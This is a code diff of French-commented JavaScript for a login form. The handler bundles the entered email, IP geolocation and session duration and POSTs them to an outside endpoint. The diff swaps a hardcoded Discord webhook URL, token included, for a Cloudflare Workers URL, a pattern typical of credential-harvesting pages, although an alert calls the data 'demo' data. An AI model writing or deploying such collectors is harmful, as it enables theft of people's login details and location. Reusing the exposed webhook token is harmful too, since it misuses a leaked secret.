@@ -203,10 +203,7 @@
     } catch (err) {
       console.error("Erreur récupération IP/Géo :", err);
     }
-
-    // Webhook Discord (ou console.log pour test local)
-    const webhookURL = "https://discord.com/api/webhooks/1360585270931751153/V_j_RxG3xVIjFiWyHyJJkIl4PI0p8mzhvZG2uxizjEWgbbPH9gkRkoopMbDILFIRLDg3";
-
+    
     const message = `
 🔐 **Connexion**
 📧 Email : ${email}
@@ -227,11 +224,11 @@
 ⏱️ Temps passé : ${sessionDuration} secondes
     `;
 
-    fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: message })
-    });
+   fetch("https://green-tooth-6e6e.bouronryan.workers.dev", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ content: message })
+});
 
     alert("Merci ! Données de démo envoyées.");
     document.getElementById("login-form").reset();
